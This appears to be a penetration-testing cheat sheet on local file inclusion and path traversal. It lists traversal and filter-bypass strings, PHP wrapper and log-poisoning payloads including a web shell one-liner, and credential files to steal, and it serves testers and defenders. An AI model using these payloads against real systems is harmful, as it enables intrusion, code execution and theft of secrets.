# Local File Inclusion / Path Traversal

**What it is:** User input reaches a filesystem path (`include`, `require`, `readFile`, template loader, download/export handler) without normalization → read arbitrary files, and on PHP often escalate to RCE via wrappers, log poisoning, or session files.

## Where to look
Params that name a file/template/page: `?file=`, `?page=`, `?lang=`, `?template=`, `?path=`, `?download=`, `?doc=`, `?img=`, export/report generators, theme/skin selectors, `include`-style routers, avatar/attachment fetch.

## Traversal + encoding bypass
- `../../../etc/passwd`, Windows `..\..\..\windows\win.ini`.
- Non-recursive strip (filter deletes one `../`): `....//....//etc/passwd`, `..././..././`.
- URL/double-URL encode: `%2e%2e%2f`, `..%252f..%252fetc/passwd`.
- Overlong UTF-8 / backslash / mixed: `..%c0%af`, `..%5c`, `%2e%2e/`.
- Null byte / truncation (legacy PHP <5.3.4): `../../etc/passwd%00.png`; long-path `./`×N truncation.
- Absolute path when base isn't prepended: `/etc/passwd`; leading-slash strip: `//etc/passwd`.
- Prefix/suffix append: if app adds `.php`, use a wrapper or `%00`; if it prepends a dir, traverse out of it.

## PHP wrappers
- [ ] **Read source (no exec):** `php://filter/convert.base64-encode/resource=index.php` → base64 of source. Case-insensitive `pHp://FilTer/...`. Chain: `php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd`.
- [ ] **RFI-style exec:** `data://text/plain;base64,<b64 of <?php system($_GET[c]);?>>`, `expect://id` (if ext enabled).
- [ ] **ZIP:** upload a zip renamed `.jpg`, include `zip://shell.jpg%23payload.php`. **PHAR:** `phar://upload.jpg/x` → object injection if a gadget is autoloaded (`03-injection/08`).
- [ ] **Filter-chain RCE:** php://filter chains (`convert.iconv.*`) that build a bootstrap payload in-memory (no upload needed) — use `php_filter_chain_generator`.

## LFI → RCE (paths)
- [ ] **Log poisoning:** inject `<?php system($_GET[c]);?>` via a logged field, then include the log:
  - Apache `/var/log/apache2/access.log` (User-Agent), SSH `/var/log/auth.log` (`ssh '<?php...?>'@host`), mail `/var/log/mail.log` (`RCPT TO:<?php...?>`), vsftpd `/var/log/vsftpd.log` (username).
- [ ] **`/proc/self/environ`** — inject PHP in `User-Agent`, include the file (works when readable).
- [ ] **PHP session file:** put payload in a session var, include `/var/lib/php/sessions/sess_<PHPSESSID>`.
- [ ] **`PHP_SESSION_UPLOAD_PROGRESS`:** multipart POST with the payload in the filename creates a session file even with no session cookie set — race the include.
- [ ] **`/proc/<pid>/fd/<n>`** brute-force after mass-uploading temp files (segfault to keep temp files alive).
- [ ] **Mail spool:** email PHP to a local user → include `/var/mail/<user>` or `/var/spool/mail/<user>`.

## High-value files to grab
`/etc/passwd`, `/etc/shadow`, app config (`.env`, `config.php`, `web.config`, `settings.py`, `wp-config.php`), `/proc/self/cmdline`, `/proc/version`, SSH keys `~/.ssh/id_rsa`, cloud creds `~/.aws/credentials`, source of the vuln script itself (via php://filter).

## Impact
Source/secret disclosure (→ auth bypass, further attacks), RCE (PHP wrappers / log poisoning), SSRF (some wrappers), cred theft.

## Tools
`LFISuite`, `ffuf`/`Intruder` with LFI wordlists (SecLists `LFI/`), `php_filter_chain_generator`, Burp.

## 🎯 PoC — Request → Response
**Source read via php://filter:**
```http
GET /view?page=php://filter/convert.base64-encode/resource=config HTTP/2
Host: target.com
```
```http
HTTP/2 200 OK

PD9waHAgJGRiX3Bhc3N3b3JkID0gJ3N1cGVyc2VjcmV0Jzsg...   ← base64 → config.php source w/ DB creds
```

## Deep cuts
- [ ] **Secondary-context traversal:** the path reaches an *internal* proxied service, not local disk — `/api/../../etc/passwd`, `..;/` (see `09-advanced/13-secondary-context.md`).
- [ ] **Template-engine LFI:** loader takes a path you control → include a file that then renders as a template → SSTI (`03-injection/03`).
- [ ] **Windows:** `web.config` machineKey → ViewState RCE (`12-tech-specific/06`); ADS `::$DATA`; UNC `\\collab\x` for OOB read.
- [ ] **Download/export handlers** are the quiet ones: `DownloadExcel?fileName=../../web.config`, `?report=../../../.env`.

## Report notes
Read a benign non-secret file (`/etc/hostname`, `/proc/version`) or your own source to prove; don't dump `shadow`/live secrets beyond minimal proof. State whether it's read-only LFI or escalated to RCE (name the vector: wrapper / log / session).

## Related
`03-injection/06-ssrf.md` · `03-injection/08-deserialization.md` · `03-injection/03-ssti.md` · `09-advanced/13-secondary-context.md` · `12-tech-specific/06-aspnet-iis.md`
